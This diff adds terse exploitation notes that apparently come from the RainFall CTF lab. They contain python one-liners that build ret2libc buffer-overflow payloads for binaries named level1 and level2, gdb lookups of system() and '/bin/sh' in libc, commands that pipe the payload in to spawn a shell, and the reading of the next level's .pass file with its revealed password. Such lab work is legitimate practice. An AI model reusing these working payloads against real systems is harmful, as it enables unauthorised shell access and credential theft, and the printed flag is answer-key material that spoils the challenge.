@@ -1,0 +1,20 @@
+python2.7 -c 'print("X"*76 + "\xd4\x84\x04\x08" +"\x60\xb0\xe6\xb7" + "XXXX" + "\x58\xcc\xf8\xb7")' > /tmp/exploit.txt
+080484d4 <p>:
+0804853f <main>:
+print system
+ 0xb7e6b060 <system>
+ 0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+ find 0xb7e2c000, +9999999, "/bin/sh"
+ 0xb7f8cc58:      "/bin/sh"
+ cat /tmp/exploit.txt /dev/stdin | ./level1
+
+  804853e:       c3                      ret    
+  0xb7e6b060 <system>
+
+level2@RainFall:~$ python2.7 -c 'print("X"*80 + "\xd2\x84\x04\x08" +"\x60\xb0\xe6\xb7" + "XXXX" + "\x58\xcc\xf8\
+xb7")' > /tmp/exploit.txt 
+level2@RainFall:~$ cat /tmp/exploit.txt /dev/stdin | ./level2 
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`��XXXXX���
+cd /home/user/level3
+cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
